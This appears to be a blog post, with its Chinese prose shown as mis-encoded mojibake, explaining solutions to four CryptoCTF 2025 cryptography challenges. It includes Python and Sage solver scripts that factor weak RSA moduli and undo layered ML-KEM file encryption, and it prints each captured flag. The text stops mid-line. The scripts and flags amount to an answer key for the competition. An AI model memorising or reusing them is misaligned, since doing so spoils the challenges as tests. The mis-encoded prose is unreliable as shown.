[{"title":"2025 CryptoCTF é¢˜è§£","url":"/2025/07/15/2025%20CryptoCTF%E9%A2%98%E8%A7%A3/","content":"å‰è¨€æœ€è¿‘æ­£å€¼æš‘å‡ï¼Œé—²ç€ä¹Ÿæ˜¯é—²ç€ï¼Œäºæ˜¯æ¥ç©ç©å§ã€‚æˆ‘å‘ç°è‡ªå·±çœŸçš„å¾ˆå¼±å°ï¼Œè¿™äº›èµ›é¢˜çš„åˆ†å€¼ä¸è§£å‡ºçš„é˜Ÿä¼æ•°é‡æˆåæ¯”ï¼Œå°†æ‰€æœ‰çš„é¢˜ç›®æŒ‰ç…§æœ€ç»ˆåˆ†å€¼æ’åºï¼Œæˆ‘æ°å¥½å®Œæˆäº†åˆ†å€¼æœ€å°‘çš„å››é“ã€‚åŠ ä¸Šäº‹åè¡¥çš„ä¸¤é“ï¼Œå…±å®Œæˆäº†åˆ†å€¼æœ€å°‘çš„å…­é“ã€‚\nâ€”â€”å°±æ˜¯è¯´éš¾çš„ä¸€é“éƒ½ä¸ä¼šï¼ˆèººï¼‰\næ­£æ–‡æ—¢ç„¶éƒ½è¿™æ ·äº†ï¼Œé‚£å¹²è„†å°±æŒ‰ç…§æœ€ç»ˆé¢˜ç›®åˆ†æ•°å‡åºå†™é¢˜è§£å§ï¼ŒæŒ‰ç†æ¥è¯´ï¼Œè¶Šå‰é¢çš„è¶Šç®€å•ã€‚\n1.Vinadè§‚å¯Ÿä»£ç ï¼Œæˆ‘ä»¬å¾—åˆ°äº†pubkeyçš„ç¬¬1å’Œç¬¬2é¡¹ï¼Œå³Rå’Œp*qï¼Œå’ŒåŠ å¯†åçš„cã€‚è‹¥è¦è§£å‡ºåŸæ–‡ï¼Œéœ€è¦å¾—åˆ°pæˆ–è€…qï¼Œä»¥åŠeã€‚åœ¨genkey()å‡½æ•°ä¸­ï¼Œqæ˜¯éšæœºç”Ÿæˆçš„512ä½è´¨æ•°ï¼Œpå’Œeéƒ½ä¸å‡½æ•°vinad()æœ‰å…³ï¼Œæˆ‘ä»¬è‡ªç„¶æƒ³çŸ¥é“ï¼Œvinad()åœ¨åšä»€ä¹ˆã€‚å¯¹äºç»™å®šçš„åˆ—è¡¨Rï¼Œvinad()å–å‡ºæ¯ä¸€ä¸ªå…ƒç´ rï¼Œå°†å…¶ä¸xå¼‚æˆ–ï¼Œè¿”å›å¼‚æˆ–åçš„&#39;1&#39;çš„ä¸ªæ•°çš„å¥‡å¶ï¼Œå¥‡æ•°ä¸º1ï¼Œå¶æ•°ä¸º0ã€‚å°†æ‰€æœ‰çš„rå¦‚æ­¤æ“ä½œï¼Œç»“æœæ‹¼æˆçš„å­—ç¬¦ä¸²å°±æ˜¯è¿”å›å€¼çš„äºŒè¿›åˆ¶å½¢å¼ã€‚å‡è®¾å…¶ä¸­æŸä¸¤æ¬¡å–å‡ºçš„å…ƒç´ ä¸º$r_1$å’Œ$r_2$ï¼Œé‚£ä¹ˆï¼Œè®°$x \\oplus r_1 = k_1$ï¼Œ$x \\oplus r_2 = k_2$ï¼Œåˆ™$k_1 \\oplus k_2 = \\text{XOR}(x,r_1,x,r_2)$ã€‚è€Œ$x \\oplus x = 0$ï¼Œå¯¹ç»“æœæ²¡æœ‰å½±å“ï¼Œæ‰€ä»¥$k_1 \\oplus k_2 = r_1 \\oplus r_2$ã€‚å…¶ä¸­$\\oplus$ç¬¦å·å’Œ$\\text{XOR}$å‡è¡¨ç¤ºå¼‚æˆ–ã€‚è¿™æ ·ä¸€æ¥ï¼Œè™½ç„¶xæ˜¯ä¸€ä¸ªå¾ˆå¤§çš„æœªçŸ¥æ•°ï¼Œä½†ä»»æ„ä¸¤ä¸ªç»“æœçš„å¼‚æˆ–å€¼éƒ½å·²ç»èƒ½ä»Rä¸­çŸ¥æ™“ï¼Œæ¢è¨€ä¹‹ï¼Œåªè¦çŸ¥é“äº†å…¶ä¸­ä¸€ä¸ªç»“æœ(0æˆ–è€…1)ï¼Œå°±çŸ¥é“äº†å…¨éƒ¨çš„ç»“æœã€‚xå®é™…ä¸Šå’Œåªèƒ½å–0/1æ²¡æœ‰åŒºåˆ«ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å–x=0ï¼Œå¾—åˆ°Q = int(&#39;&#39;.join(str(parinad(R[i])) for i in range(512)), 2)ï¼Œå¾—åˆ°pçš„ä¸€ä¸ªå€™é€‰å€¼ï¼›å¦‚æœn%Q!=0ï¼Œå³Qä¸æ­£ç¡®ï¼Œé‚£ä¹ˆï¼Œå°†æ¯ä¸€ä½å–åï¼Œå°±æ˜¯å¦ä¸€ä¸ªå€™é€‰å€¼Q_altã€‚ç»è¿‡éªŒè¯ï¼Œå¯ä»¥å¾—åˆ°på’Œqã€‚\nå¯¹äºeï¼Œæˆ‘ä»¬å·²ç»åˆ†æå¾—åˆ°vinad()å‡½æ•°åœ¨Rç»™å®šçš„æƒ…å†µä¸‹åªæœ‰ä¸¤ç§å¯èƒ½çš„ç»“æœï¼Œç”¨Qå’ŒQ_altè¯•ä¸¤æ¬¡å°±å¯ä»¥ã€‚\n#Crypto CTF https://cr.yp.toc.tf/ vinadé¢˜è§£from Crypto.Util.number import *R = [] #Rå¤ªå ç‰ˆé¢äº†ï¼Œå°±åˆ æ‰äº†ã€‚é¢˜ç›®é™„ä»¶é‡Œå·²ç»ç»™å‡ºn = 58113574203067314600162910771848744432179168354040678920098167335472534222998261639291145191568159464990603689062679467360303185717662426122140998218656632568172511390111887830539687208220100574329903748617343193392646019854280519859403817579746765861359633174218846216669659258251676438195667516224684805919c = 56754194307199340085459028397027924827853574000671575387226403396873568994756738512141122143372650573201079937375922460851170745485734799044781029943783218210457587599666501326645229924138230588050782907693019958930006807017898115655426823272342984109999519420817119999272583495848119171867835187241510764427def parinad(n):    return bin(n)[2:].count(&#x27;1&#x27;) % 2# 1. æ±‚å‡ºpå’ŒqQ = int(&#x27;&#x27;.join(str(parinad(R[i])) for i in range(512)), 2)Q_alt = (1&lt;&lt;512) - 1 - Qif n % Q == 0 and isPrime(Q):    p = Qelse:    p = Q_alt#print(p)assert isPrime(p) and n%p==0#print(sum(R))e = Q_altq = n//p# 2. è®¡ç®—æ¬§æ‹‰å‡½æ•° Ï†(n)phi_n = (q - 1)*(p - 1)#print(&quot;phi = &quot;,phi_n)# 3. è®¡ç®— d (e çš„æ¨¡ Ï†(n) çš„ä¹˜æ³•é€†å…ƒ)d = inverse(e, phi_n)#print(&quot;d = &quot;,d)# 4. è§£å¯†æ¶ˆæ¯ mm = pow(c, d, n)  # å¿«é€Ÿæ¨¡å¹‚è¿ç®—print(&quot;è§£å¯†åçš„æ¶ˆæ¯ m ä¸º:&quot;, long_to_bytes(m - sum(R)))#CCTF&#123;s0lV1n9_4_Syst3m_0f_L1n3Ar_3qUaTi0n5_0vEr_7H3_F!3lD_F(2)!&#125;#æœ¬é¢˜ç”±ChatGPTæä¾›æ€è·¯ä¸ä»£ç \n2.Interpolè§‚å¯Ÿä»£ç ï¼Œrandpos()å‡½æ•°åœ¨0å’Œ1ä¹‹é—´é€‰ä¸€ä¸ªæ•°ã€‚å¦‚æœé€‰1ï¼Œè¿”å›Trueå’Œä¸€ä¸ªæœ‰ä¸¤ä¸ªæ•°çš„å…ƒç»„ï¼Œè¿™ä¸¤ä¸ªæ•°å’Œflagç›¸å…³ï¼›å¦‚æœé€‰0ï¼Œè¿”å›Falseå’Œå¦å¤–ä¸€ä¸ªå…ƒç»„ï¼Œè¿™ä¸ªå…ƒç»„çš„ä¸¤ä¸ªæ•°æ˜¯ä¸€ä¸ªéšæœºæ•´æ•°å’Œä¸€ä¸ªéšæœºçš„æœ‰ç†æ•°ã€‚æ¥ä¸‹æ¥æ˜¯while(True)éƒ¨åˆ†ï¼šå…ˆå¾—åˆ°ä¸€ä¸ªrandpos()çš„ç»“æœï¼Œå¦‚æœè¿”å›Trueï¼Œé‚£ä¹ˆnè‡ªå¢1ï¼Œå¦åˆ™nä¸å¢åŠ ã€‚ä½†æ— è®ºå¦‚ä½•ï¼ŒDATAéƒ½ä¼šå°†æ–°ç”Ÿæˆçš„å…ƒç»„åŠ å…¥ï¼Œä¾‹å¤–æƒ…å†µæ˜¯_d[0][0]åœ¨Hä¸­ï¼Œå³å…ƒç»„çš„ç¬¬ä¸€ä¸ªæ•°åœ¨Hä¸­ã€‚æ¥ä¸‹æ¥ä½¿ç”¨æ‹‰æ ¼æœ—æ—¥æ’å€¼ï¼Œå°†ä»¥ä¸Šå…ƒç»„è¡¨ç¤ºçš„ç‚¹å˜ä¸ºä¸€ä¸ªæœ‰ç†æ•°åŸŸçš„å‡½æ•°ï¼Œæˆ‘ä»¬æœ€åå¾—åˆ°äº†è¿™ä¸ªå‡½æ•°ã€‚å› æ­¤ï¼Œå‡½æ•°ä¸Šçš„ç‚¹å°±åŒ…å«äº†flagä¸Šçš„ç‚¹ï¼Œæ ¹æ®randpos()å‡½æ•°æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œç”±flagå¾—åˆ°çš„ç‚¹ï¼Œå…¶æ¨ªåæ ‡ä¸€å®šæ˜¯è´Ÿæ•°ï¼Œçºµåæ ‡ä¸€å®šæ˜¯æ•´æ•°ï¼Œè€Œéšæœºç‚¹çš„æ¨ªåæ ‡å¤§äºç­‰äº0ï¼Œçºµåæ ‡ä¹Ÿæ˜¯ä¸¤ä¸ªè´¨æ•°ä¹‹æ¯”ï¼Œä¸ä¼šæ˜¯æ•´æ•°ã€‚æˆ‘ä»¬æ®æ­¤å¾—åˆ°æ‰€æœ‰æ»¡è¶³x&lt;0çš„æ•´ç‚¹ï¼Œå°±æ˜¯ç”±flagå¾—åˆ°çš„ç‚¹ã€‚å¯¹äºç‚¹(-x,y)ï¼Œæˆ‘ä»¬æœ‰x = 1 + (19*n - 14) % len(flag)ï¼Œy = ord(flag[(63 * n - 40) % len(flag)])ã€‚ï¼ˆn&lt;len(flag)ï¼‰å³ï¼š$n = (x + 13) \\times \\text{inverse}(19)\\space \\bmod \\text{len(flag)}$ï¼Œ$\\text{chr}(y) = \\text{flag}[(63 \\times n - 40)\\space \\bmod \\text{len(flag)}]$ã€‚äºæ˜¯å¯ä»¥æ ¹æ®æ¯ä¸ªxå¾—åˆ°å¯¹åº”çš„nï¼Œè¿›è€Œå¾—åˆ°flagä¸­æ¯ä¸ªå­—ç¬¦çš„ä½ç½®ã€‚è¿™é‡Œå‡è®¾len(flag)å’Œ19ï¼Œå’Œ63å‡äº’è´¨ï¼Œå¦åˆ™ï¼Œflagä¸å”¯ä¸€ã€‚\n#Crypto CTF https://cr.yp.toc.tf/ Interpolé¢˜è§£#!/usr/bin/env sage# ä» output.raw åŠ è½½åºåˆ—åŒ–å¤šé¡¹å¼with open(&#x27;output.raw&#x27;, &#x27;rb&#x27;) as f:    poly_str = f.read()# ååºåˆ—åŒ–å¤šé¡¹å¼P = loads(poly_str)# å®šä¹‰å¤šé¡¹å¼å‡½æ•° p(x)p = P# æ­¥éª¤1: æ”¶é›†å€™é€‰çœŸç‚¹ (x, y)ï¼Œå…¶ä¸­ x ä¸ºè´Ÿæ•´æ•°ï¼Œp(x) ä¸ºæ•´æ•°points = []x_val = -1consecutive_non_integer = 0threshold = 20  # è¿ç»­éæ•´æ•°é˜ˆå€¼ï¼Œç”¨äºåœæ­¢è¿­ä»£while consecutive_non_integer &lt; threshold:    try:        y_val = p(x_val)  # è®¡ç®— p(x)        # æ£€æŸ¥æ˜¯å¦ä¸ºæ•´æ•°ï¼ˆæœ‰ç†æ•°ä¸”åˆ†æ¯ä¸º1ï¼‰        if y_val in ZZ or (y_val in QQ and y_val.denominator() == 1):            points.append((x_val, ZZ(y_val)))  # è®°å½•ç‚¹            consecutive_non_integer = 0  # é‡ç½®è®¡æ•°å™¨        else:            consecutive_non_integer += 1    except Exception as e:  # å¤„ç†å¯èƒ½çš„æ±‚å€¼é”™è¯¯ï¼ˆå¦‚ x è¿‡å¤§ï¼‰        consecutive_non_integer += 1    x_val -= 1  # ç§»è‡³ä¸‹ä¸€ä¸ªè´Ÿæ•´æ•°if not points:    raise ValueError(&quot;æœªæ‰¾åˆ°å€™é€‰ç‚¹ã€‚æ£€æŸ¥æ–‡ä»¶è·¯å¾„æˆ–å¤šé¡¹å¼ã€‚&quot;)# æŒ‰ x æ’åºï¼ˆé™åºï¼š-1, -2, -3, ...ï¼‰points.sort(key=lambda pt: pt[0], reverse=True)# æ­¥éª¤2: æ¨å¯¼ L = len(flag)min_x = min(x for x, y in points)  # æœ€å° xï¼ˆæœ€è´Ÿï¼‰L_candidate = -min_x  # L = -min_xnum_points = len(points)# éªŒè¯ç‚¹æ•°æ˜¯å¦åˆç†ï¼ˆåº”æ¥è¿‘ L_candidateï¼‰if num_points &lt; L_candidate:    print(f&quot;è­¦å‘Š: åªæ‰¾åˆ° &#123;num_points&#125; ä¸ªç‚¹ï¼Œä½† L_candidate = &#123;L_candidate&#125;ã€‚å¯èƒ½æœ‰é—æ¼ã€‚&quot;)elif num_points &gt; L_candidate:    print(f&quot;è­¦å‘Š: æ‰¾åˆ° &#123;num_points&#125; ä¸ªç‚¹ï¼Œä½† L_candidate = &#123;L_candidate&#125;ã€‚å¯èƒ½æœ‰è¯¯æŠ¥ã€‚&quot;)    # æˆªæ–­è‡³å‰ L_candidate ä¸ªç‚¹ï¼ˆå‡è®¾ x æœ€å°çš„ç‚¹å¯èƒ½ä¸ºè¯¯æŠ¥ï¼‰    points = points[:L_candidate]L = L_candidate  # ä½¿ç”¨ L_candidate ä½œä¸º flag é•¿åº¦# æ­¥éª¤3: è®¡ç®— 19 æ¨¡ L çš„é€†å…ƒï¼ˆç”¨äºç´¢å¼•æ˜ å°„ï¼‰try:    inv19 = inverse_mod(19, L)  # 19 åœ¨æ¨¡ L ä¸‹çš„é€†å…ƒexcept Exception as e:    raise ValueError(f&quot;19 å’Œ L=&#123;L&#125; ä¸äº’è´¨ï¼Œæ— æ³•è®¡ç®—é€†å…ƒã€‚é”™è¯¯: &#123;e&#125;&quot;)# æ­¥éª¤4: æ˜ å°„æ¯ä¸ªç‚¹åˆ° flag å­—ç¬¦flag_array = [None] * L  # åˆå§‹åŒ– flag æ•°ç»„for x, y in points:    # è®¡ç®— a = (19n - 14) % Lï¼ˆæ¥è‡ªçœŸç‚¹ x å…¬å¼ï¼‰    a = -1 - x  # å› ä¸º x = -(1 + a)    if a &lt; 0 or a &gt;= L:        print(f&quot;è­¦å‘Š: x=&#123;x&#125; çš„ a=&#123;a&#125; è¶…å‡º [0, L-1]ã€‚è·³è¿‡ã€‚&quot;)        continue        # è®¡ç®— nï¼ˆçœŸç‚¹ç´¢å¼•ï¼‰    c = a + 14  # æ¥è‡ª a = (19n - 14) % L    n_val = (c * inv19) % L  # n = (c * inv19) mod L        # è®¡ç®— bï¼ˆflag å­—ç¬¦ä½ç½®ï¼‰    b_val = (63 * n_val - 40) % L  # b = (63n - 40) % L        # æ£€æŸ¥ y æ˜¯å¦ä¸ºå¯æ‰“å° ASCII    if y &lt; 32 or y &gt; 126:        print(f&quot;è­¦å‘Š: x=&#123;x&#125; çš„ y=&#123;y&#125; ä¸æ˜¯å¯æ‰“å° ASCIIã€‚è·³è¿‡ã€‚&quot;)        continue        # å­˜å‚¨å­—ç¬¦ï¼ˆä½ç½® b_valï¼‰    flag_array[b_val] = chr(y)# æ£€æŸ¥æ˜¯å¦æ‰€æœ‰ä½ç½®éƒ½å·²å¡«å……if None in flag_array:    missing = [i for i, char in enumerate(flag_array) if char is None]    print(f&quot;è­¦å‘Š: ä½ç½® &#123;missing&#125; æœªå¡«å……ã€‚å°è¯•è°ƒæ•´ç‚¹é›†åˆæˆ– Lã€‚&quot;)else:    print(&quot;æ‰€æœ‰ä½ç½®å¡«å……æˆåŠŸã€‚&quot;)# æ„å»º flag å­—ç¬¦ä¸²flag_str = &#x27;&#x27;.join(flag_array)print(f&quot;æ¢å¤çš„ flag: &#123;flag_str&#125;&quot;)#CCTF&#123;7h3_!nTeRn4t10naL_Cr!Min41_pOlIc3_0r9An!Zati0n!&#125;#æœ¬é¢˜ç”±ChatGPTå’ŒDeepseekæä¾›æ€è·¯ï¼ŒDeepseekæä¾›ä»£ç \n3.Mechanicä»£ç å¾ˆçŸ­ï¼Œä½†æ˜¯é‡è§äº†ä¸è®¤è¯†çš„åº“ï¼Œå¤šåŠæ˜¯åœ¨è°ƒç”¨åº“å‡½æ•°åŠ å¯†äº†ï¼Œä¸Šç½‘æ‰¾æ‰¾å¦‚ä½•è§£å¯†ã€‚æœç´¢KryptonKEMæ‰¾åˆ°äº†https://github-wiki-see.page/m/aabmets/quantcrypt/wiki/Code-Examplesï¼Œçœ‹åˆ°â€œKryptonKEM for Asymmetric File Encryptionâ€ä¸€èŠ‚ï¼Œæ‰¾åˆ°äº†ç›¸å…³çš„ç¤ºä¾‹ä»£ç ã€‚åŠ å¯†çš„æµç¨‹æ˜¯ï¼Œè¯»å–flag.pngï¼Œç”Ÿæˆ40ä½éšæœºæ•°ï¼Œæ ¹æ®è¯¥éšæœºæ•°çš„æ¯”ç‰¹ï¼Œå†³å®šæ˜¯å¯¹æ˜æ–‡/ä¸Šä¸€è½®å¯†æ–‡è¿›è¡Œä¸€æ¬¡åŠ å¯†ï¼Œå¹¶å°†skey(secret_key)å†™å…¥æ–‡ä»¶ä¸­ï¼Œè¿˜æ˜¯ä¼ªé€ ä¸€ç»„skeyå†™å…¥æ–‡ä»¶ä¸­ã€‚å› æ­¤ï¼Œä¸€å…±ç”Ÿæˆäº†40æ¬¡å¯†é’¥ï¼Œå…¶ä¸­æœ‰éƒ¨åˆ†æ˜¯çœŸçš„ï¼Œä¹Ÿæœ‰ä¸€äº›æ˜¯å‡çš„ã€‚æ ¹æ®æœ€åçš„æ–‡ä»¶åflag_22.encï¼Œä¸€å…±è¿›è¡Œäº†23è½®åŠ å¯†ã€‚åŒæ—¶æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œå…ˆåŠ å¯†çš„å¯†é’¥ä¸€å®šåœ¨ååŠ å¯†çš„å¯†é’¥ä¹‹å‰ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥ä»æœ€åä¸€ä¸ªå¯†é’¥å¼€å§‹ï¼Œä¸æ–­å‘å‰è¯•æ¢ï¼Œå¾—åˆ°æœ€åˆçš„æ–‡ä»¶ã€‚å¦‚æœé‡åˆ°å‡ç§é’¥ï¼Œè§£å¯†ä¼šæŠ¥é”™ï¼Œæ ¹æ®èƒ½å¦è§£å¯†åˆ¤æ–­æ˜¯å¦ä¸ºçœŸçš„ç§é’¥ã€‚ä¸ºäº†é˜²æ­¢è§£å¯†ä¸­é—´æ–‡ä»¶è¢«å ç”¨è€Œæ— æ³•å†™å…¥ï¼Œæ¯ä¸€ä¸ªæ–‡ä»¶éƒ½ä½¿ç”¨ä¸åŒçš„æ–‡ä»¶åã€‚è¿è¡Œä¸€éç¨‹åºï¼Œå°±å¯ä»¥å¾—åˆ°æœ€åˆçš„flag.pngä»¥åŠï¼Œkem.param_sizes.sk_size = 3168ï¼ˆè‡ªå·±å·å·è£…è¿™ä¸ªåº“ï¼Œåœ¨pythonè·‘ä¸€éå°±çŸ¥é“äº†ï¼‰\n#Crypto CTF https://cr.yp.toc.tf/ mechanicé¢˜è§£#!/usr/bin/env python3from quantcrypt.kem import MLKEM_1024from quantcrypt.cipher import KryptonKEMfrom pathlib import Pathkem = MLKEM_1024()kry = KryptonKEM(MLKEM_1024)SK_SIZE = 3168TOTAL_LAYERS = 23# --- 1. è¯»å–å¹¶åˆ‡åˆ† output.raw ---raw = Path(&#x27;output.raw&#x27;).read_bytes()assert len(raw) % SK_SIZE == 0, &quot;output.raw é•¿åº¦å¿…é¡»æ˜¯ SK_SIZE çš„æ•´æ•°å€&quot;chunks = [ raw[i:i+SK_SIZE]           for i in range(0, len(raw), SK_SIZE) ]# --- 2. å‡†å¤‡åˆå§‹å¯†æ–‡è·¯å¾„ ---current_ct = Path(&#x27;flag_22.enc&#x27;)found_sks = []# ä»åå¾€å‰éå†æ¯ä¸€æ®µç§é’¥for idx, sk in enumerate(reversed(chunks)):    if len(found_sks) &gt;= TOTAL_LAYERS:        break    # ç”Ÿæˆå”¯ä¸€çš„ä¸´æ—¶è¾“å‡ºæ–‡ä»¶å    tmp_path = Path(f&#x27;tmp_&#123;len(found_sks)&#125;.out&#x27;)    try:        # è§£å¯†åˆ°å”¯ä¸€æ–‡ä»¶        kry.decrypt_to_file(sk, current_ct, tmp_path)        # è§£å¯†æˆåŠŸï¼Œè®°å½•ç§é’¥ï¼Œå¹¶æ›´æ–° current_ct        found_sks.append(sk)        current_ct = tmp_path        print(f&quot;âœ” ç”¨ chunks[&#123;len(chunks)-1-idx&#125;] è§£å‡ºäº†ç¬¬ &#123;len(found_sks)&#125; å±‚ â†’ &#123;tmp_path.name&#125;&quot;)    except Exception as e:        print(&quot;ERROR: &quot;,e)        continueassert len(found_sks) == TOTAL_LAYERS, &quot;æ²¡æ‰¾åˆ°æ‰€æœ‰ç§é’¥æ®µï¼&quot;# æœ€ç»ˆæŠŠ current_ct é‡å‘½åä¸º flag.pngcurrent_ct.rename(&#x27;flag.png&#x27;)print(&quot;ğŸ‰ å·²æˆåŠŸè¿˜åŸå‡º flag.png&quot;)#CCTF&#123;k3y_3NcAp5uL4t!0n_M3cH4n1Sms!&#125;#æœ¬é¢˜ç”±ChatGPTæä¾›æ€è·¯å’Œä»£ç ï¼Œç•¥åšä¿®æ­£\n4.Mancityæ°”æ€¥è´¥åçš„å…¸å‹ç¤ºä¾‹â€”â€”ä¸è¿‡è¿˜æ˜¯å…ˆåˆ†æä¸€ä¸‹ä»£ç å§keygen()ç”Ÿæˆäº†ä¸¤ä¸ªè´¨æ•°ï¼Œè¿™ä¸¤ä¸ªè´¨æ•°éƒ½ç”±åŒä¸€ä¸ª256bitçš„è´¨æ•°på˜åŒ–è€Œæ¥ï¼Œè´¨æ•°råœ¨pçš„æ¯ä¸€ä¸ªbitåéƒ½å¢åŠ ä¸€ä¸ª&#39;1&#39;ï¼Œè´¨æ•°qåœ¨påé¢å¢åŠ 256ä¸ª&#39;1&#39;ï¼Œè¿™æ ·qå’Œréƒ½æ˜¯512ä½è´¨æ•°ï¼Œä¸”å…¶ä¸­ä¸€åŠçš„ä½æˆ‘ä»¬å·²ç»çŸ¥é“äº†å‡è®¾bin(p)=10010â€¦01ï¼Œåˆ™r = 1101011101â€¦0111ï¼Œq = 10010â€¦011111â€¦11ï¼Œåˆ™qçš„ä½256ä½å·²çŸ¥ã€‚æˆ‘ä»¬å°†qå’Œråˆ’åˆ†ä¸ºhighå’Œlowï¼Œå…¶ä¸­é«˜256ä½ä¸ºhighï¼Œä½256ä½ä¸ºlowï¼Œåˆ™$q_{low} = 2^{256}-1$ã€‚å¯¹$n = q*r$ä¸¤è¾¹åŒæ—¶æ¨¡$2^{256}$ï¼Œåˆ™å¯çŸ¥$n$çš„ä½256ä½å®Œå…¨ç”±$q_{low}$å’Œ$r_{low}$å†³å®šï¼Œäºæ˜¯å¯ä»¥æ±‚$q_{low}$çš„é€†å…ƒï¼Œä¹˜ä¸Š$n$çš„ä½256ä½ï¼Œå†æ¨¡$2^{256}$ï¼Œå¾—åˆ°$r_{low}$ã€‚$r_{low}$çš„äºŒè¿›åˆ¶å½¢å¼é‡Œï¼Œæœ‰ä¸€åŠæ˜¯&#39;1â€˜ï¼Œå¦ä¸€åŠæ˜¯pçš„ä½128ä½ã€‚ç”±æ­¤æˆ‘ä»¬å¾—åˆ°äº†pçš„ä½128ä½ï¼Œä¹Ÿå°±æ˜¯qçš„256-383ä½ï¼Œäºæ˜¯å¯ä»¥é‡å¤ä¸Šè¿°è¿‡ç¨‹ï¼Œæ¯æ¬¡åªéœ€è¦è°ƒæ•´æ¨¡æ•°ï¼Œå°±å¯ä»¥ä¸æ–­å‘pçš„é«˜ä½æ¨è¿›ã€‚ç†è®ºä¸Šè¿™ä¸ªæ–¹æ³•å¯ä»¥æ¨è¿›åˆ°åªå‰©æœ€å1ä½æœªçŸ¥ï¼Œå®é™…ä¸Šè¿è¡Œåˆ°240ä½çš„æ—¶å€™å°±æŠ¥é”™äº†ï¼Œä¸è¿‡å‰©ä¸‹16ä½å¹¶ä¸ç®—å¤šï¼Œæš´åŠ›ç ´è§£ä¸€è½®å³å¯ã€‚å¾—åˆ°påæ¨å‡ºqå’Œrï¼Œè¿›è€Œè¿˜åŸæ¶ˆæ¯mã€‚\näº‹åå‘ç°ï¼Œå¦‚æœ$r_{low}$è§£å‡ºæ¥çš„æœ€é«˜ä½æ˜¯0ï¼Œé‚£ä¹ˆå¡«å……1çš„ä½ç½®ä¸ä¼šè¢«æ­£ç¡®æ£€æµ‹åˆ°ï¼Œå› è€Œä¸èƒ½å¾—åˆ°æ­£ç¡®çš„pã€‚æˆ‘å¢åŠ äº†å¯¹äº$r_{low}$æ¯”ç‰¹é•¿åº¦çš„æ£€æµ‹ï¼Œå¦‚æœæ˜¯å¥‡æ•°ï¼Œå°±è¡¥ä¸Šæœ€å‰é¢çš„&#39;0&#39;ï¼Œè¿™æ ·å°±å¯ä»¥ç»§ç»­è§£ç äº†ã€‚æ‰æˆ‘æ°”æ€¥è´¥åï¼Œç”šè‡³å†™äº†5ä¸ªåŒæ ·çš„å‡½æ•°å»åšåŒä¸€ä»¶äº‹â€¦â€¦è¿˜æ˜¯ä¸å¤Ÿè€ç»ƒåªéœ€è¦ä½¿ç”¨æœ€åçš„recover()å‡½æ•°ï¼Œå¾ªç¯ä»£å…¥æ¯ä¸€è½®çš„pï¼ŒåŠ ä¸Šæœ€å256ä¸ª&#39;1&#39;ä½œä¸º$q_{low}$ï¼Œå³å¯è§£å‡ºã€‚\n#Crypto CTF https://cr.yp.toc.tf/ Mancityé¢˜è§£def decode(p_man:str):    orig_bits = &#x27;&#x27;    for i in range(0, len(p_man), 2):        two_bits = p_man[i:i + 2]        if two_bits == &#x27;01&#x27;:            orig_bits += &#x27;0&#x27;        elif two_bits == &#x27;11&#x27;:            orig_bits += &#x27;1&#x27;        else:            raise ValueError(f&quot;Invalid bit pair: &#123;two_bits&#125;&quot;)    return orig_bitsdef recover_256(n:int):    q = 2**256-1    modulus = 2 ** (32 + 64 + 128 + 256)    inv = pow(q, -1, modulus)    p = bin((n % modulus) * inv % modulus)[2:]    if len(p) % 2:        p = &#x27;0&#x27; + p    assert all(p[i] == &#x27;1&#x27; for i in range(1, len(p), 2))    return pdef recover_128(n:int):    q = int(&#x27;11011101001110011100110101111001000101001101011110110111001100100001011111001100001100001010001110110001100001000100110111111111&#x27;+&#x27;1&#x27;*256,2)    modulus = 2 ** (32 + 64 + 128 + 256)    inv = pow(q, -1, modulus)    p = bin((n % modulus) * inv % modulus)[2:]    if len(p) % 2:        p = &#x27;0&#x27; + p    assert all(p[i] == &#x27;1&#x27; for i in range(1, len(p), 2))    return pdef recover_64(n:int):    q = int(&#x27;111101111110100010100000100010100110101111000001100000011010011011011101001110011100110101111001000101001101011110110111001100100001011111001100001100001010001110110001100001000100110111111111&#x27;+&#x27;1&#x27;*256,2)    modulus = 2 ** (32 + 64 + 128 + 256)    inv = pow(q, -1, modulus)    p = bin((n % modulus) * inv % modulus)[2:]    if len(p) % 2:        p = &#x27;0&#x27; + p    assert all(p[i] == &#x27;1&#x27; for i in range(1, len(p), 2))    return pdef recover_32(n:int):    q = int(&#x27;11110111000111010010000101100001111101111110100010100000100010100110101111000001100000011010011011011101001110011100110101111001000101001101011110110111001100100001011111001100001100001010001110110001100001000100110111111111&#x27;+&#x27;1&#x27;*256,2)    modulus = 2 ** (32 + 64 + 128 + 256)    inv = pow(q, -1, modulus)    p = bin((n % modulus) * inv % modulus)[2:]    if len(p) % 2:        p = &#x27;0&#x27; + p    assert all(p[i] == &#x27;1&#x27; for i in range(1, len(p), 2))    return pdef recover_16(n:int):    q = int(&#x27;110101000111000011110111000111010010000101100001111101111110100010100000100010100110101111000001100000011010011011011101001110011100110101111001000101001101011110110111001100100001011111001100001100001010001110110001100001000100110111111111&#x27;+&#x27;1&#x27;*256,2)    modulus = 2 ** (32 + 64 + 128 + 256)    inv = pow(q, -1, modulus)    p = bin((n % modulus) * inv % modulus)[2:]    if len(p) % 2:        p = &#x27;0&#x27; + p    assert all(p[i] == &#x27;1&#x27; for i in range(1, len(p), 2))    return pdef recover(n:int,q_bit:str):    q = int(q_bit+&#x27;1&#x27;*256, 2)    modulus = 2 ** (len(q_bit) + 256)    inv = pow(q, -1, modulus)    p = bin((n % modulus) * inv % modulus)[2:]    if len(p) % 2:        p = &#x27;0&#x27; + p    assert all(p[i] == &#x27;1&#x27; for i in range(1, len(p), 2))    return p# ç»™å®šå‚æ•°n = 147170819334030469053514652921356515888015711942553338463409772437981228515273287953989706666936875524451626901247038180594875568558137526484665015890594045767912340169965961750130156341999306808017498374501001042628249176543370525803456692022546235595791111819909503496986338431136130272043196908119165239297# æ¢å¤å› å­#p = recover_256(n)#print(decode(p))#ç¬¬ä¸€è½®çš„p:11011101001110011100110101111001000101001101011110110111001100100001011111001100001100001010001110110001100001000100110111111111#è¿™æ˜¯æœ€ä½çš„128ä½#p2 = recover_128(n)#print(decode(p2))#ç¬¬äºŒè½®çš„p:111101111110100010100000100010100110101111000001100000011010011011011101001110011100110101111001000101001101011110110111001100100001011111001100001100001010001110110001100001000100110111111111#è¿™æ˜¯128+64=192ä½#p3 = recover_64(n)#print(decode(p3))#ç¬¬ä¸‰è½®çš„pï¼š11110111000111010010000101100001111101111110100010100000100010100110101111000001100000011010011011011101001110011100110101111001000101001101011110110111001100100001011111001100001100001010001110110001100001000100110111111111#128+64+32=224ä½#p4 = 